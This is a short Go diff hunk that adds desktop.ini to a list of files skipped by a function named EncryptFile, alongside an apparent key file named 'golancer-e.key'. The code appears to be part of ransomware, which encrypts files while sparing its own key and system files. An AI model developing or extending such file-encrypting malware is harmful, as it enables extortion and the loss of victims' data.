@@ -200,6 +200,8 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 		return
 	case strings.HasSuffix(filename, "golancer-e.key"):
 		return
+	case strings.HasSuffix(filename, "desktop.ini"):
+		return
 	}
 
 	// Open target file
